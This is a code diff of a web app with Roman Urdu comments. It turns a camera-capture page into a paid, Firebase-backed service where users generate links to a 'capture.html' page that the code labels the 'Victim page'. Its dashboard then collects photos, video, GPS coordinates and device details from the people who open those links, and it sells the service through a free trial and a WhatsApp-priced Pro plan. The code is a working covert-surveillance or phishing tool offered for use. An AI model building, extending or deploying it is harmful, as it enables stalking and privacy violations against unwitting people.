+        <li>3 Links only</li><li>All features</li><li>Basic stats</li>
+        <li class="off">Unlimited links</li><li class="off">Priority support</li>
+      </ul>
+      <button class="secondary block" onclick="closeUpgrade()">Current Plan</button>
     </div>
+    <div class="price-card pro-card">
+      <div class="price-icon pro">👑</div>
+      <div class="price-title">Pro</div>
+      <div class="price-amount">1500 <span>PKR/mo</span></div>
+      <div class="price-desc">Unlimited sab kuch</div>
+      <ul class="price-features">
+        <li>Unlimited links</li><li>All features unlocked</li><li>Advanced stats</li>
+        <li>Priority support</li><li>WhatsApp direct contact</li>
+      </ul>
+      <button class="whatsapp block" onclick="openWhatsApp()">💬 WhatsApp par Contact</button>
+    </div>
+  </div>
+  <div class="card" style="text-align:center;">
+    <button class="secondary small" onclick="closeUpgrade()">← Back to Dashboard</button>
   </div>
 </div>
 
-<!-- ========== SUCCESS VIEW ========== -->
-<div id="successView" class="hidden">
-  <div class="container">
-    <div class="card">
-      <div class="check-circle">✓</div>
-      <h1 style="color:#00ffb3; margin-bottom:10px;">Photo Submitted!</h1>
-      <p style="opacity:0.75; margin-bottom:20px;">Aapki photo safely save ho gayi hai.</p>
-      <button class="primary" onclick="restartCamera()">📷 Take Another</button>
-    </div>
-  </div>
+<div class="modal" id="modal" onclick="closeModal(event)">
+  <button class="modal-close" onclick="closeModal()">✕</button>
+  <div class="modal-content" id="modalContent"></div>
 </div>
 
-<!-- ========== INITIAL LOADING ========== -->
-<div id="loadingView" class="container">
-  <div class="card loading">
-    <div class="spinner"></div>
-    <h2 style="color:#00d4ff;">Camera Permission Required</h2>
-    <p style="opacity:0.7; margin-top:10px;">Please allow camera access when prompted</p>
-  </div>
-</div>
+<script type="module">
+import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-app.js";
+import { getAuth, createUserWithEmailAndPassword, signInWithEmailAndPassword, signOut, onAuthStateChanged, updateProfile, GoogleAuthProvider, signInWithPopup } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-auth.js";
+import { getFirestore, collection, addDoc, getDocs, deleteDoc, doc, query, where, serverTimestamp, getDoc, setDoc, updateDoc, increment, onSnapshot } from "https://www.gstatic.com/firebasejs/10.7.0/firebase-firestore.js";
 
-<!-- ========== ADMIN LOGIN ========== -->
-<div id="adminLoginView" class="hidden">
-  <div class="container">
-    <header>
-      <h1>🔐 Admin Access</h1>
-      <p>Enter secret code to unlock</p>
-    </header>
-    <div class="card" style="max-width:420px; margin:auto; text-align:center;">
-      <h2>Enter Code</h2>
-      <input type="text" id="secretInput" class="secret-input" maxlength="3" inputmode="numeric" placeholder="---" autocomplete="off">
-      <button class="primary" style="width:100%;" onclick="checkSecret()">🔓 Unlock</button>
-      <p style="opacity:0.5; font-size:0.8rem; margin-top:15px;">Hint: 3 digits</p>
-    </div>
-  </div>
-</div>
+/* ========== CONFIG ========== */
+const firebaseConfig = {
+  apiKey: "AIzaSyBW17Z4J5ru9EbpiEfygz_Dpj8ekJuKqBg",
+  authDomain: "decision-b42a6.firebaseapp.com",
+  projectId: "decision-b42a6",
+  storageBucket: "decision-b42a6.firebasestorage.app",
+  messagingSenderId: "108149086619",
+  appId: "1:108149086619:web:63f17a58695f1d7a1e293e"
+};
 
-<!-- ========== ADMIN PANEL ========== -->
-<div id="adminPanelView" class="hidden">
-  <div class="container">
-    <header>
-      <h1>📊 Admin Panel</h1>
-      <p>All captured photos</p>
-    </header>
+const WHATSAPP_NUMBER = "923084191378";  // ✅ Aapka number
+const PRO_PRICE = "1500";
+const FREE_TRIAL_LIMIT = 3;
+const CAPTURE_PAGE = "capture.html";   // Victim page file name
 
-    <div class="card">
-      <div class="stats">
-        <div class="stat-box"><h3 id="totalCount">0</h3><p>Total Photos</p></div>
-        <div class="stat-box"><h3 id="todayCount">0</h3><p>Today</p></div>
-        <div class="stat-box"><h3 id="storageSize">0 KB</h3><p>Storage</p></div>
-      </div>
+/* ========== INIT ========== */
+const app = initializeApp(firebaseConfig);
+const auth = getAuth(app);
+const db = getFirestore(app);
 
-      <div style="display:flex; gap:10px; flex-wrap:wrap; margin-bottom:15px;">
-        <button class="secondary small" onclick="downloadBackup()">⬇️ Backup (JSON)</button>
-        <button class="secondary small" onclick="document.getElementById('importFile').click()">⬆️ Restore</button>
-        <button class="danger small" onclick="clearAll()">🗑️ Clear All</button>
-        <button class="secondary small" onclick="adminLogout()">🚪 Logout</button>
-      </div>
-      <input type="file" id="importFile" accept=".json" style="display:none" onchange="importBackup(event)">
+let currentUser = null;
+let userData = null;
+let liveUnsubscribe = null;
 
-      <input type="search" id="searchBox" placeholder="🔍 Search by time..." oninput="renderPhotos()">
-    </div>
-
-    <div class="card">
-      <h2>📸 Captured Photos</h2>
-      <div id="photoList" class="photo-grid"></div>
-    </div>
-  </div>
-</div>
-
-<div id="toast" class="toast"></div>
-<div id="flash" class="flash"></div>
-
-<script>
-/* ============================================================
-   CONFIG
-============================================================ */
-const SECRET_CODE = "000";          // 🔓 Unlock code
-const STORAGE_KEY = "captured_photos_v1";
-const BACKUP_KEY = "last_backup_date";
-
-let videoStream = null;
-let capturedDataUrl = null;
-
-/* ============================================================
-   STORAGE
-============================================================ */
-function getPhotos() {
-  try { return JSON.parse(localStorage.getItem(STORAGE_KEY) || "[]"); }
-  catch { return []; }
-}
-function savePhotos(photos) {
-  try {
-    localStorage.setItem(STORAGE_KEY, JSON.stringify(photos));
-    localStorage.setItem("last_save", new Date().toISOString());
-    return true;
-  } catch (e) {
-    if (e.name === "QuotaExceededError") {
-      showToast("Storage full! Backup le ke clear karo.", true);
-    } else {
-      showToast("Save error: " + e.message, true);
-    }
-    return false;
-  }
-}
-
-/* ============================================================
-   TOAST
-============================================================ */
-function showToast(msg, isError = false) {
+/* ========== HELPERS ========== */
+window.showToast = function(msg, isError = false, isInfo = false) {
   const t = document.getElementById("toast");
   t.textContent = msg;
-  t.className = "toast show" + (isError ? " error" : "");
-  setTimeout(() => t.className = "toast", 2800);
+  t.className = "toast show" + (isError ? " error" : isInfo ? " info" : "");
+  clearTimeout(t._to);
+  t._to = setTimeout(() => t.className = "toast", 3500);
 }
 
-/* ============================================================
-   VIEW SWITCHER
-============================================================ */
-function showView(id) {
-  ["cameraView","previewView","successView","loadingView","adminLoginView","adminPanelView"]
-    .forEach(v => document.getElementById(v).classList.add("hidden"));
+const ALL_VIEWS = ["loadingView","authView","dashboardView","upgradeView"];
+window.showView = function(id) {
+  ALL_VIEWS.forEach(v => document.getElementById(v).classList.add("hidden"));
   document.getElementById(id).classList.remove("hidden");
+  window.scrollTo({ top: 0, behavior: "smooth" });
 }
 
-/* ============================================================
-   ROUTER - URL decides what to show
-============================================================ */
-function route() {
-  const hash = location.hash;
-  const params = new URLSearchParams(location.search);
-
-  // Admin route
-  if (hash === "#admin") {
-    if (sessionStorage.getItem("adminLogged") === "1") {
-      showView("adminPanelView");
-      renderPhotos();
-    } else {
-      showView("adminLoginView");
-      setTimeout(() => document.getElementById("secretInput")?.focus(), 200);
-    }
-    stopCamera();
-    return;
-  }
-
-  // Default: user → camera
-  startCamera();
+window.switchAuth = function(mode) {
+  document.getElementById("tabLogin").classList.toggle("active", mode === "login");
+  document.getElementById("tabRegister").classList.toggle("active", mode === "register");
+  document.getElementById("loginForm").classList.toggle("hidden", mode !== "login");
+  document.getElementById("registerForm").classList.toggle("hidden", mode !== "register");
 }
 
-window.addEventListener("hashchange", route);
-window.addEventListener("load", route);
+/* ========== REGISTER ========== */
+window.doRegister = async function() {
+  const name = document.getElementById("regName").value.trim();
+  const email = document.getElementById("regEmail").value.trim().toLowerCase();
+  const pass = document.getElementById("regPass").value;
+  if (!name || !email || !pass) return showToast("Sab fields bharo", true);
+  if (pass.length < 6) return showToast("Password 6+ characters ka ho", true);
+  if (!/^\S+@\S+\.\S+$/.test(email)) return showToast("Valid email daalo", true);
 
-/* ============================================================
-   CAMERA
-============================================================ */
-async function startCamera() {
-  showView("cameraView");
-
-  // Agar already stream hai to use karo
-  if (videoStream) {
-    document.getElementById("video").srcObject = videoStream;
-    return;
-  }
+  document.getElementById("regBtn").disabled = true;
+  document.getElementById("regBtn").textContent = "Creating...";
 
   try {
-    videoStream = await navigator.mediaDevices.getUserMedia({
-      video: {
-        facingMode: "user",  // front camera
-        width: { ideal: 1280 },
-        height: { ideal: 720 }
-      },
-      audio: false
+    const cred = await createUserWithEmailAndPassword(auth, email, pass);
+    await updateProfile(cred.user, { displayName: name });
+    await setDoc(doc(db, "users", cred.user.uid), {
+      name, email, plan: "trial", linksUsed: 0, provider: "email", createdAt: serverTimestamp()
     });
-    document.getElementById("video").srcObject = videoStream;
-  } catch (err) {
-    console.error("Camera error:", err);
-    showToast("Camera access denied! Please allow & reload.", true);
-    setTimeout(() => {
-      document.getElementById("cameraView").innerHTML = `
-        <div class="container">
-          <div class="card" style="text-align:center; padding:40px;">
-            <h2 style="color:#ff4d4d;">❌ Camera Blocked</h2>
-            <p style="opacity:0.8; margin:15px 0;">
-              Camera permission deny ho gayi hai.<br><br>
-              Please browser settings me camera allow karo aur page reload karo.
-            </p>
-            <button class="primary" onclick="location.reload()">🔄 Reload</button>
-          </div>
-        </div>`;
-    }, 500);
+    showToast("Account bana! Free trial started 🎉");
+  } catch (e) {
+    let msg = e.message;
+    if (e.code === "auth/email-already-in-use") msg = "Ye email already registered hai";
+    else if (e.code === "auth/invalid-email") msg = "Email valid nahi hai";
+    else if (e.code === "auth/weak-password") msg = "Password weak hai";
+    else if (e.code === "auth/operation-not-allowed") msg = "⚠️ Firebase me Email/Password enable karo";
+    showToast(msg, true);
+  } finally {
+    document.getElementById("regBtn").disabled = false;
+    document.getElementById("regBtn").textContent = "✨ Create Free Account";
   }
 }
 
-function stopCamera() {
-  if (videoStream) {
-    videoStream.getTracks().forEach(t => t.stop());
-    videoStream = null;
+/* ========== LOGIN ========== */
+window.doLogin = async function() {
+  const email = document.getElementById("loginEmail").value.trim().toLowerCase();
+  const pass = document.getElementById("loginPass").value;
+  if (!email || !pass) return showToast("Email & password daalo", true);
+  document.getElementById("loginBtn").disabled = true;
+  document.getElementById("loginBtn").textContent = "Logging in...";
+  try {
+    await signInWithEmailAndPassword(auth, email, pass);
+    showToast("Welcome back! 👋");
+  } catch (e) {
+    let msg = "Galat email ya password";
+    if (e.code === "auth/operation-not-allowed") msg = "⚠️ Firebase me Email/Password enable karo";
+    if (e.code === "auth/too-many-requests") msg = "Bohat zyada attempts. Thodi der baad try karo";
+    showToast(msg, true);
+  } finally {
+    document.getElementById("loginBtn").disabled = false;
+    document.getElementById("loginBtn").textContent = "🔓 Login";
   }
 }
 
-function restartCamera() {
-  capturedDataUrl = null;
-  route();
-}
-
-/* ============================================================
-   CAPTURE PHOTO
-============================================================ */
-function capturePhoto() {
-  const video = document.getElementById("video");
-  if (!video.videoWidth) {
-    showToast("Camera not ready yet...", true);
-    return;
-  }
-
-  // Flash effect
-  const flash = document.getElementById("flash");
-  flash.classList.add("active");
-  setTimeout(() => flash.classList.remove("active"), 150);
-
-  // Canvas me draw (mirror reset karo)
-  const canvas = document.createElement("canvas");
-  canvas.width = video.videoWidth;
-  canvas.height = video.videoHeight;
-  const ctx = canvas.getContext("2d");
-
-  // Mirror flip wapas (selfie style)
-  ctx.translate(canvas.width, 0);
-  ctx.scale(-1, 1);
-  ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-
-  capturedDataUrl = canvas.toDataURL("image/jpeg", 0.75);
-
-  document.getElementById("previewImg").src = capturedDataUrl;
-  showView("previewView");
-}
-
-function retakePhoto() {
-  capturedDataUrl = null;
-  showView("cameraView");
-}
-
-/* ============================================================
-   SUBMIT PHOTO → Save to admin panel
-============================================================ */
-function submitPhoto() {
-  if (!capturedDataUrl) {
-    showToast("No photo captured!", true);
-    return;
-  }
-
-  const photo = {
-    id: Date.now(),
-    image: capturedDataUrl,
-    time: new Date().toLocaleString(),
-    iso: new Date().toISOString(),
-    device: navigator.userAgent.includes("Mobile") ? "Mobile" : "Desktop"
-  };
-
-  const photos = getPhotos();
-  photos.unshift(photo);
-
-  if (savePhotos(photos)) {
-    capturedDataUrl = null;
-    showView("successView");
-    showToast("Photo saved successfully ✅");
+/* ========== GOOGLE LOGIN ========== */
+window.doGoogleLogin = async function() {
+  const provider = new GoogleAuthProvider();
+  provider.setCustomParameters({ prompt: 'select_account' });
+  try {
+    const result = await signInWithPopup(auth, provider);
+    const user = result.user;
+    const userSnap = await getDoc(doc(db, "users", user.uid));
+    if (!userSnap.exists()) {
+      await setDoc(doc(db, "users", user.uid), {
+        name: user.displayName || "User", email: user.email,
+        plan: "trial", linksUsed: 0, provider: "google",
+        photoURL: user.photoURL || null, createdAt: serverTimestamp()
+      });
+      showToast(`Welcome ${user.displayName || ""}! 🎉`);
+    } else {
+      showToast(`Welcome back ${user.displayName || ""}! 👋`);
+    }
+  } catch (e) {
+    if (e.code === "auth/popup-closed-by-user") return;
+    if (e.code === "auth/popup-blocked") { showToast("Browser ne popup block kiya. Allow karo.", true); return; }
+    if (e.code === "auth/unauthorized-domain") { showToast("⚠️ Firebase me is domain ko authorize karo", true); return; }
+    showToast("Google login fail: " + e.message, true);
   }
 }
 
-/* ============================================================
-   SECRET UNLOCK (000)
-============================================================ */
-function checkSecret() {
-  const input = document.getElementById("secretInput");
-  const val = input.value.trim();
+window.doLogout = async function() {
+  if (liveUnsubscribe) liveUnsubscribe();
+  await signOut(auth);
+  showToast("Logged out");
+}
 
-  if (val === SECRET_CODE) {
-    sessionStorage.setItem("adminLogged", "1");
-    input.value = "";
-    showToast("Unlocked! 🔓");
-    showView("adminPanelView");
-    renderPhotos();
-    stopCamera();
+/* ========== AUTH STATE ========== */
+onAuthStateChanged(auth, async (user) => {
+  if (user) {
+    currentUser = user;
+    try {
+      const userSnap = await getDoc(doc(db, "users", user.uid));
+      if (userSnap.exists()) userData = userSnap.data();
+      else {
+        userData = { name: user.displayName || "User", email: user.email, plan: "trial", linksUsed: 0 };
+        await setDoc(doc(db, "users", user.uid), { ...userData, provider: user.providerData?.[0]?.providerId || "email", createdAt: serverTimestamp() });
+      }
+    } catch (e) {
+      userData = { name: user.displayName || "User", email: user.email, plan: "trial", linksUsed: 0 };
+    }
+    updateNavUser(user, userData);
+    showView("dashboardView");
+    await loadUserStats();
+    await renderMedia();
+    renderPlanCard();
+    updateFeatureButtons();
+    startLiveListener();
   } else {
-    input.value = "";
-    showToast("Wrong code! ❌", true);
-    input.style.borderColor = "#ff4d4d";
-    setTimeout(() => input.style.borderColor = "rgba(0,212,255,0.4)", 800);
-  }
-}
-
-// Enter key dabane pe bhi check ho
-document.addEventListener("keydown", e => {
-  if (e.key === "Enter" && !document.getElementById("adminLoginView").classList.contains("hidden")) {
-    checkSecret();
+    currentUser = null;
+    userData = null;
+    document.getElementById("navUser").innerHTML = "";
+    if (liveUnsubscribe) { liveUnsubscribe(); liveUnsubscribe = null; }
+    showView("authView");
   }
 });
 
-function adminLogout() {
-  sessionStorage.removeItem("adminLogged");
-  location.hash = "";
-  location.reload();
+function updateNavUser(user, data) {
+  const initials = (user.displayName || user.email)[0].toUpperCase();
+  const photoURL = user.photoURL;
+  document.getElementById("navUser").innerHTML = `
+    <span style="opacity:0.7;">${user.displayName?.split(" ")[0] || user.email.split("@")[0]}</span>
+    ${photoURL ? `<img src="${photoURL}" class="nav-avatar" style="object-fit:cover;">` : `<div class="nav-avatar">${initials}</div>`}
+  `;
+  document.getElementById("dashName").textContent = user.displayName || "User";
+  document.getElementById("dashEmail").textContent = user.email;
+  document.getElementById("dashAvatar").innerHTML = photoURL ? `<img src="${photoURL}">` : initials;
+
+  const plan = data?.plan || "trial";
+  const planClass = plan === "pro" ? "pro" : "trial";
+  const planLabel = plan === "pro" ? "👑 PRO" : "FREE TRIAL";
+  document.getElementById("planIndicator").innerHTML = `<span class="plan-badge ${planClass}">${planLabel}</span>`;
 }
 
-/* ============================================================
-   RENDER PHOTOS
-============================================================ */
-function renderPhotos() {
-  const photos = getPhotos();
-  const query = (document.getElementById("searchBox")?.value || "").toLowerCase();
+/* ========== PLAN CARD ========== */
+function renderPlanCard() {
+  const card = document.getElementById("usageContent");
+  if (!userData) return;
+  if (userData.plan === "pro") {
+    card.innerHTML = `
+      <div class="info-box" style="text-align:center;">
+        <div style="font-size:1.6rem;margin-bottom:8px;">👑</div>
+        <b style="font-size:1rem;">Pro Plan Active</b><br>
+        <span style="opacity:0.7;font-size:0.82rem;">Unlimited links aur features use kar rahe ho.</span>
+      </div>`;
+    return;
+  }
+  const used = userData.linksUsed || 0;
+  const left = Math.max(0, FREE_TRIAL_LIMIT - used);
+  const pct = Math.min(100, (used / FREE_TRIAL_LIMIT) * 100);
+  const level = pct >= 100 ? "danger" : pct >= 66 ? "warn" : "";
+  card.innerHTML = `
+    <div class="usage-bar">
+      <div class="usage-header">
+        <span style="opacity:0.75;">Free Trial Links</span>
+        <span class="count ${level}">${used} / ${FREE_TRIAL_LIMIT}</span>
+      </div>
+      <div class="usage-track"><div class="usage-fill ${level}" style="width:${pct}%"></div></div>
+      <p style="font-size:0.78rem;opacity:0.65;margin-top:10px;">
+        ${left > 0 ? `<b>${left}</b> links remaining.` : "Trial khatam! Pro me upgrade karo."}
+      </p>
+    </div>
+    <button class="whatsapp block" onclick="openWhatsApp()">💬 Upgrade to Pro — ${PRO_PRICE} PKR/month</button>
+  `;
+}
 
-  const filtered = photos.filter(p =>
-    (p.time || "").toLowerCase().includes(query) ||
-    (p.device || "").toLowerCase().includes(query)
-  );
+function updateFeatureButtons() {
+  const isTrialExhausted = userData?.plan === "trial" && (userData?.linksUsed || 0) >= FREE_TRIAL_LIMIT;
+  document.querySelectorAll("#featureGrid .feature-btn").forEach(btn => { btn.disabled = isTrialExhausted; });
+}
 
-  document.getElementById("totalCount").textContent = photos.length;
-  const today = new Date().toLocaleDateString();
-  document.getElementById("todayCount").textContent =
-    photos.filter(p => new Date(p.id).toLocaleDateString() === today).length;
-  const sizeKB = ((localStorage.getItem(STORAGE_KEY) || "").length / 1024).toFixed(1);
-  document.getElementById("storageSize").textContent = sizeKB + " KB";
+/* ========== GENERATE LINK ========== */
+window.generateLink = async function(feature) {
+  if (!currentUser || !userData) return showToast("Login karo pehle", true);
+  if (userData.plan === "trial" && (userData.linksUsed || 0) >= FREE_TRIAL_LIMIT) {
+    showToast("Trial khatam! Pro me upgrade karo.", true);
+    openUpgrade();
+    return;
+  }
+  const linkId = Math.random().toString(36).slice(2, 12);
+  try {
+    await setDoc(doc(db, "links", linkId), {
+      ownerId: currentUser.uid,
+      ownerEmail: currentUser.email,
+      ownerName: userData.name,
+      feature,
+      createdAt: serverTimestamp(),
+      used: false
+    });
+    await updateDoc(doc(db, "users", currentUser.uid), { linksUsed: increment(1) });
+    userData.linksUsed = (userData.linksUsed || 0) + 1;
 
-  const list = document.getElementById("photoList");
-  if (filtered.length === 0) {
-    list.innerHTML = `<p style="text-align:center; opacity:0.5; padding:30px; grid-column:1/-1;">No photos yet.</p>`;
+    const base = location.origin + location.pathname.replace(/[^/]*$/, "");
+    const url = `${base}${CAPTURE_PAGE}#v=${linkId}`;
+
+    document.getElementById("linkLabel").textContent = `${feature.toUpperCase()} Link Ready`;
+    document.getElementById("generatedLink").value = url;
+    document.getElementById("linkOutput").classList.remove("hidden");
+    showToast("Link generate ho gaya! 📋");
+
+    renderPlanCard();
+    updateFeatureButtons();
+  } catch (e) {
+    showToast("Link create nahi hua: " + e.message, true);
+  }
+}
+
+window.copyGeneratedLink = function() {
+  const inp = document.getElementById("generatedLink");
+  inp.select();
+  document.execCommand("copy");
+  showToast("Link copy ho gaya! 📋");
+}
+
+/* ========== UPGRADE / WHATSAPP ========== */
+window.openUpgrade = function() { showView("upgradeView"); }
+window.closeUpgrade = function() { showView("dashboardView"); }
+
+window.openWhatsApp = function() {
+  const name = userData?.name || currentUser?.displayName || "User";
+  const email = currentUser?.email || "";
+  const msg = `Assalam o Alaikum!\n\nMain Pro plan lena chahta hoon.\n\n👤 Naam: ${name}\n📧 Email: ${email}\n💎 Plan: Pro\n💰 Price: ${PRO_PRICE} PKR / month\n\nPlease payment details bhejein.`;
+  const url = `https://wa.me/${WHATSAPP_NUMBER}?text=${encodeURIComponent(msg)}`;
+  window.open(url, "_blank");
+}
+
+/* ========== LIVE LISTENER ========== */
+function startLiveListener() {
+  if (liveUnsubscribe) liveUnsubscribe();
+  const q = query(collection(db, "captures"), where("ownerId", "==", currentUser.uid));
+  liveUnsubscribe = onSnapshot(q, (snap) => {
+    loadUserStats();
+    renderMediaFromSnap(snap);
+  }, (err) => console.error("Live error:", err));
+}
+
+/* ========== STATS ========== */
+async function loadUserStats() {
+  if (!currentUser) return;
+  try {
+    const q = query(collection(db, "captures"), where("ownerId", "==", currentUser.uid));
+    const snap = await getDocs(q);
+    const items = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+    document.getElementById("sTotal").textContent = items.length;
+    const today = new Date().toDateString();
+    document.getElementById("sToday").textContent = items.filter(i => i.timestamp && new Date(i.timestamp.seconds*1000).toDateString() === today).length;
+    document.getElementById("sPhoto").textContent = items.filter(i => i.type === "photo").length;
+    document.getElementById("sVideo").textContent = items.filter(i => i.type === "video").length;
+  } catch (e) { console.error(e); }
+}
+
+/* ========== RENDER MEDIA ========== */
+window.renderMedia = async function() {
+  if (!currentUser) return;
+  const grid = document.getElementById("mediaGrid");
+  grid.innerHTML = `<div style="grid-column:1/-1;text-align:center;padding:20px;"><div class="spinner"></div></div>`;
+  try {
+    const q = query(collection(db, "captures"), where("ownerId", "==", currentUser.uid));
+    const snap = await getDocs(q);
+    renderMediaFromSnap(snap);
+  } catch (e) {
+    grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;color:#ff4d4d;">Error loading data</p>`;
+  }
+}
+
+function renderMediaFromSnap(snap) {
+  const grid = document.getElementById("mediaGrid");
+  let items = snap.docs.map(d => ({ id: d.id, ...d.data() }));
+  items.sort((a,b) => (b.timestamp?.seconds||0) - (a.timestamp?.seconds||0));
+
+  const search = (document.getElementById("searchBox")?.value || "").toLowerCase();
+  if (search) items = items.filter(i => JSON.stringify(i).toLowerCase().includes(search));
+
+  if (items.length === 0) {
+    grid.innerHTML = `<p style="grid-column:1/-1;text-align:center;opacity:0.5;padding:30px;">Abhi koi data nahi aaya.<br><span style="font-size:0.8rem;opacity:0.7;">Link client ko bhejo aur wait karo.</span></p>`;
     return;
   }
 
-  list.innerHTML = filtered.map(p => `
-    <div class="photo-card">
-      <img src="${p.image}" alt="photo" loading="lazy" onclick="viewFull('${p.id}')">
-      <div class="photo-info">
-        <div>📱 ${escapeHtml(p.device || "-")}</div>
-        <div class="time">🕒 ${escapeHtml(p.time)}</div>
+  grid.innerHTML = items.map(i => {
+    let thumb = "";
+    if (i.photo) thumb = `<img src="${i.photo}" onclick="viewMedia('${i.id}')" loading="lazy">`;
+    else if (i.type === "location") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(34,211,238,0.1);">📍</div>`;
+    else if (i.type === "device") thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;background:rgba(168,85,247,0.1);">📱</div>`;
+    else thumb = `<div style="aspect-ratio:1;display:flex;align-items:center;justify-content:center;font-size:2.5rem;">📎</div>`;
+
+    const time = i.timestamp ? new Date(i.timestamp.seconds*1000).toLocaleString() : "";
+    const loc = i.location ? `${i.location.lat?.toFixed(3)}, ${i.location.lon?.toFixed(3)}` : "";
+
+    return `
+      <div class="media-card">
+        ${thumb}
+        <div class="media-info">
+          <div class="row">🏷️ ${i.type || i.feature}</div>
+          ${loc ? `<div class="row">📍 ${loc}</div>` : ""}
+          ${i.device ? `<div class="row">📱 ${i.device.type}</div>` : ""}
+          <div class="time">🕒 ${time}</div>
+        </div>
+        <div class="media-actions">
+          <button class="danger small" onclick="deleteCapture('${i.id}')">Delete</button>
+        </div>
       </div>
-      <div class="photo-actions">
-        <button class="danger small" onclick="deletePhoto(${p.id})">Delete</button>
-      </div>
-    </div>
-  `).join("");
-
-  checkAutoBackupReminder();
+    `;
+  }).join("");
 }
 
-function escapeHtml(str) {
-  if (!str) return "";
-  return String(str).replace(/[&<>"']/g, m => ({
-    "&":"&amp;","<":"&lt;",">":"&gt;",'"':"&quot;","'":"&#39;"
-  }[m]));
+window.viewMedia = async function(id) {
+  try {
+    const snap = await getDoc(doc(db, "captures", id));
+    if (!snap.exists()) return;
+    const data = snap.data();
+    const content = document.getElementById("modalContent");
+    content.innerHTML = data.photo
+      ? `<img src="${data.photo}">`
+      : `<pre style="color:#fff;padding:20px;max-width:90vw;overflow:auto;font-size:0.8rem;">${JSON.stringify(data, null, 2)}</pre>`;
+    document.getElementById("modal").classList.add("active");
+  } catch (e) { console.error(e); }
 }
 
-function viewFull(id) {
-  const photo = getPhotos().find(p => p.id === id);
-  if (!photo) return;
-  const w = window.open("");
-  w.document.write(`
-    <html><head><title>Photo</title>
-    <style>
-      body{margin:0;background:#000;display:flex;align-items:center;justify-content:center;min-height:100vh;}
-      img{max-width:100%;max-height:100vh;}
-    </style></head>
-    <body><img src="${photo.image}"></body></html>
-  `);
+window.closeModal = function(e) {
+  if (e && e.target !== e.currentTarget && e.type === "click") return;
+  document.getElementById("modal").classList.remove("active");
+  document.getElementById("modalContent").innerHTML = "";
 }
 
-/* ============================================================
-   DELETE / CLEAR
-============================================================ */
-function deletePhoto(id) {
-  if (!confirm("Delete this photo?")) return;
-  savePhotos(getPhotos().filter(p => p.id !== id));
-  renderPhotos();
-  showToast("Photo deleted 🗑️");
+window.deleteCapture = async function(id) {
+  if (!confirm("Delete this item?")) return;
+  try {
+    await deleteDoc(doc(db, "captures", id));
+    showToast("Deleted 🗑️");
+  } catch (e) { showToast("Delete fail", true); }
 }
-
-function clearAll() {
-  const photos = getPhotos();
-  if (photos.length === 0) { showToast("No data to clear"); return; }
-
-  if (confirm(`⚠️ ${photos.length} photos delete hongi!\n\nPehle backup download karna chahte ho?`)) {
-    downloadBackup();
-    setTimeout(() => {
-      if (confirm("Backup ho gaya? Delete confirm karo:")) {
-        localStorage.removeItem(STORAGE_KEY);
-        renderPhotos();
-        showToast("All cleared 🗑️");
-      }
-    }, 800);
-  } else {
-    if (confirm("Pakka delete karna hai?")) {
-      localStorage.removeItem(STORAGE_KEY);
-      renderPhotos();
-      showToast("All cleared 🗑️");
-    }
-  }
-}
-
-/* ============================================================
-   BACKUP
-============================================================ */
-function downloadBackup() {
-  const photos = getPhotos();
-  if (photos.length === 0) { showToast("No data to backup", true); return; }
-
-  const backup = {
-    exported: new Date().toISOString(),
-    total: photos.length,
-    version: "2.0",
-    photos: photos
-  };
-
-  const blob = new Blob([JSON.stringify(backup, null, 2)], { type: "application/json" });
-  const a = document.createElement("a");
-  a.href = URL.createObjectURL(blob);
-  const date = new Date().toISOString().slice(0,10);
-  a.download = `photos_backup_${date}_${photos.length}.json`;
-  a.click();
-
-  localStorage.setItem(BACKUP_KEY, new Date().toISOString());
-  showToast(`Backup: ${photos.length} photos ✅`);
-}
-
-function importBackup(event) {
-  const file = event.target.files[0];
-  if (!file) return;
-
-  const reader = new FileReader();
-  reader.onload = function(e) {
-    try {
-      const data = JSON.parse(e.target.result);
-      const photos = data.photos || data;
-      if (!Array.isArray(photos)) throw new Error("Invalid file");
-
-      const current = getPhotos();
-      const merge = current.length > 0
-        ? confirm(`Current: ${current.length}\nBackup: ${photos.length}\n\nOK = Merge\nCancel = Replace`)
-        : false;
-
-      let final;
-      if (merge) {
-        const ids = new Set(current.map(p => p.id));
-        final = [...current, ...photos.filter(p => !ids.has(p.id))];
-      } else {
-        final = photos;
-      }
-
-      savePhotos(final);
-      renderPhotos();
-      showToast(`Restored! Total: ${final.length} ✅`);
-    } catch (err) {
-      showToast("Invalid backup file ❌", true);
-    }
-  };
-  reader.readAsText(file);
-  event.target.value = "";
-}
-
-function checkAutoBackupReminder() {
-  const last = localStorage.getItem(BACKUP_KEY);
-  const photos = getPhotos();
-  if (photos.length === 0 || !last) return;
-  const days = (Date.now() - new Date(last).getTime()) / (1000*60*60*24);
-  if (days >= 7) {
-    setTimeout(() => showToast(`⚠️ ${Math.floor(days)} din se backup nahi liya!`, true), 1500);
-  }
-}
-
-/* ============================================================
-   PAGE CLOSE → stop camera
-============================================================ */
-window.addEventListener("beforeunload", stopCamera);
 </script>
 </body>
 </html>
